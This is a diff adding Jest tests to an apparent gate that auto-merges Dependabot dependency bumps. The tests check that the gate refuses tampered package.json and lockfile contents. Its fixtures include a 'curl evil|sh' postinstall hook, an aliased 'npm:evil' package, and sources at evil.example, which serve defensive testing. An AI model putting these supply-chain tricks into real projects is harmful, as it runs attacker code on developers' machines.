@@ -9,6 +9,30 @@ const {
 
 const REPO = 'streetlives/streetlives-api';
 const HEAD_SHA = 'aaaaaaaabbbbbbbbccccccccddddddddeeeeeeee';
+const BASE_SHA = '1111111122222222333333334444444455555555';
+
+// A manifest that only moves a version, and a lockfile that only names the
+// registry -- what a real Dependabot change looks like from the inside.
+const DEFAULT_CONTENTS = {
+  [`package.json@${BASE_SHA}`]: {
+    name: 'streetlives-api',
+    scripts: { test: 'NODE_ENV=test jest --runInBand' },
+    dependencies: { express: '4.16.2' },
+  },
+  [`package.json@${HEAD_SHA}`]: {
+    name: 'streetlives-api',
+    scripts: { test: 'NODE_ENV=test jest --runInBand' },
+    dependencies: { express: '4.16.4' },
+  },
+  [`package-lock.json@${HEAD_SHA}`]: {
+    packages: {
+      '': { name: 'streetlives-api' },
+      'node_modules/express': {
+        resolved: 'https://registry.npmjs.org/express/-/express-4.16.4.tgz',
+      },
+    },
+  },
+};
 
 const CONFIG = {
   baseBranches: ['develop'],
@@ -59,7 +83,7 @@ function basePr() {
     draft: false,
     mergeable: true,
     user: { login: 'dependabot[bot]' },
-    base: { ref: 'develop', sha: '1111111122222222333333334444444455555555' },
+    base: { ref: 'develop', sha: BASE_SHA },
     head: {
       ref: 'dependabot/npm_and_yarn/express-4.16.4',
       sha: HEAD_SHA,
@@ -81,6 +105,9 @@ function fixture(overrides = {}) {
     reviews: [],
     checkRuns: [passingCheck('test')],
     checkCount: undefined,
+    // Contents keyed by `${path}@${ref}`; the gate reads both sides of every
+    // manifest and the head side of every lockfile.
+    contents: undefined,
     status: { state: 'success', total_count: 2 },
     ...overrides,
   };
@@ -119,6 +146,17 @@ function makeApi(state) {
       };
     }
     if (path.endsWith('/status')) return state.status;
+    const file = path.match(/\/contents\/(.+)\?ref=(.+)$/);
+    if (file) {
+      const store = state.contents || DEFAULT_CONTENTS;
+      const found = store[`${file[1]}@${file[2]}`];
+      if (found === undefined) {
+        const missing = new Error(`not found: ${file[1]}@${file[2]}`);
+        missing.status = 404;
+        throw missing;
+      }
+      return JSON.stringify(found);
+    }
     throw new Error(`unexpected request: ${method} ${path}`);
   };
   return { api, calls };
@@ -393,5 +431,91 @@ describe('state that changes during inspection', () => {
     const reviewRead = paths.indexOf(`/repos/${REPO}/pulls/225/reviews?per_page=100`);
     const checkRead = paths.findIndex(path => path.indexOf('/check-runs') !== -1);
     expect(reviewRead).toBeGreaterThan(checkRead);
+  });
+});
+
+describe('reading the change rather than trusting its description', () => {
+  // The exploit Codex reproduced on yourpeer.nyc#713: a collaborator can have
+  // GitHub sign a commit attributed to Dependabot, so correct-looking patch
+  // metadata proves nothing about what the manifest actually does. CI runs these
+  // scripts.
+  const refusesContents = async (overrides, expected) => {
+    const { result, mutations } = await decide({
+      contents: { ...DEFAULT_CONTENTS, ...overrides },
+    });
+    expect(result.outcome).toBe('skipped');
+    expect(result.reason).toMatch(expected);
+    expect(mutations).toEqual([]);
+  };
+
+  it('refuses a manifest that neuters the test script alongside a real bump', async () => {
+    await refusesContents({
+      [`package.json@${HEAD_SHA}`]: {
+        name: 'streetlives-api',
+        scripts: { test: 'true' },
+        dependencies: { express: '4.16.4' },
+      },
+    }, /changes `scripts` in package\.json/);
+  });
+
+  it('refuses a postinstall hook added under a dependency bump', async () => {
+    await refusesContents({
+      [`package.json@${HEAD_SHA}`]: {
+        name: 'streetlives-api',
+        scripts: { test: 'NODE_ENV=test jest --runInBand', postinstall: 'curl evil|sh' },
+        dependencies: { express: '4.16.4' },
+      },
+    }, /changes `scripts` in package\.json/);
+  });
+
+  it('refuses an aliased dependency, which is a different package entirely', async () => {
+    await refusesContents({
+      [`package.json@${HEAD_SHA}`]: {
+        name: 'streetlives-api',
+        scripts: { test: 'NODE_ENV=test jest --runInBand' },
+        dependencies: { express: 'npm:evil@1.0.0' },
+      },
+    }, /not a plain version range/);
+  });
+
+  it('refuses a git or tarball source in place of a version', async () => {
+    await refusesContents({
+      [`package.json@${HEAD_SHA}`]: {
+        name: 'streetlives-api',
+        scripts: { test: 'NODE_ENV=test jest --runInBand' },
+        dependencies: { express: 'git+https://evil.example/express.git#v1' },
+      },
+    }, /not a plain version range/);
+  });
+
+  it('refuses a lockfile that resolves a package off the registry', async () => {
+    await refusesContents({
+      [`package-lock.json@${HEAD_SHA}`]: {
+        packages: {
+          'node_modules/express': { resolved: 'https://evil.example/express.tgz' },
+        },
+      },
+    }, /not the npm registry/);
+  });
+
+  it('accepts the legacy http registry entries this lockfile still carries', async () => {
+    const { result } = await decide({
+      contents: {
+        ...DEFAULT_CONTENTS,
+        [`package-lock.json@${HEAD_SHA}`]: {
+          packages: {
+            'node_modules/got': {
+              resolved: 'http://registry.npmjs.org/got/-/got-6.7.1.tgz',
+            },
+          },
+        },
+      },
+    });
+    expect(result.outcome).toBe('merged');
+  });
+
+  it('still merges when the manifest only moves a version', async () => {
+    const { result } = await decide();
+    expect(result.outcome).toBe('merged');
   });
 });
